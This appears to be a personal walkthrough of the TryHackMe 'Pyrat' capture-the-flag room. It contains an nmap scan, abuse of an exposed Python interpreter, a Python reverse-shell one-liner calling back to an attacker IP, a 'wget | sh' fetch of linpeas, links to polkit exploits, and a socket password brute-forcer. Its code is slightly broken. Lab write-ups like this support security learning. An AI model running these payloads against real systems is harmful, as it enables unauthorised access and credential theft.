```http
https://tryhackme.com/room/pyrat
```

```ip
10.10.138.253
```
___
___
# RECON
## Nmap
```bash
nmap 10.10.138.253 -p- -sS -Pn --vv -T5-oN Pyrat.txt
```

```results nmap
Discovered open port 22/tcp on 10.10.138.253
Discovered open port 8000/tcp on 10.10.138.253
```
___
### Check 8000 port
Discovered open port 8000/tcp on 10.10.138.253
```bash
──(goose㉿kali)-[/tmp]
└─$ curl http://10.10.138.253:8000
Try a more basic connection   
```
___

# RCE

```bash
nc 10.10.138.253 8000
```

```bash
name 'ip' is not defined
id

whoami
name 'whoami' is not defined
'
EOL while scanning string literal (<string>, line 1)
''

)
unmatched ')' (<string>, line 1)
:
invalid syntax (<string>, line 1)
```

> [!NOTE]
> Python Interpreter)))

## Payload
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.34",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```
___
___
# LPE
___
/opt/dev/.git
```bash
cat config
```

```results
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = **************
```

### Serach google 
```http
site:github.com 'josemlwdf@github.com'
```

### BINGo
```http
https://github.com/josemlwdf/PyRAT
```
# Linpeas

```bash
wget -qO- 10.9.1.34:80/linpeas.sh | sh
```

```http
https://github.com/LucasPDiniz/CVE-2021-3560
https://github.com/swapravo/polkadots
```


___
___
# SSH creds!!!
```bash
[credential "https://github.com"]
        username = think
        password = ********
```


```python3
import socket
from tqdm import tqdm  # Для прогресс-бара (установка: pip install tqdm)

def brute_force(host, port, wordlist_path="/usr/share/wordlists/rockyou.txt
"):
    with open(wordlist_path, "r", errors="ignore") as f:
        passwords = [line.strip() for line in f.readlines()]

    for password in tqdm(passwords, desc="Перебор паролей"):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            
            # Ждём "Password:"
            data = s.recv(1024).decode()
            if "Password:" not in data:
                continue
            
            # Отправляем текущий пароль
            s.sendall(password.encode() + b"\n")
            
            # Проверяем ответ
            response = s.recv(1024).decode()
            if "Welcome Admin" in response:
                print(f"\n[+] Успех! Пароль: {password}")
                return password
            
            s.close()
        except:
            continue
    
    print("\n[-] Пароль не найден в rockyou.txt.")
    return None

# Запуск
brute_force("10.9.1.34", 8000)  # Подставь свой IP и порт
```
___
___
# Root flag
```bash
cat /root/root.txt
```
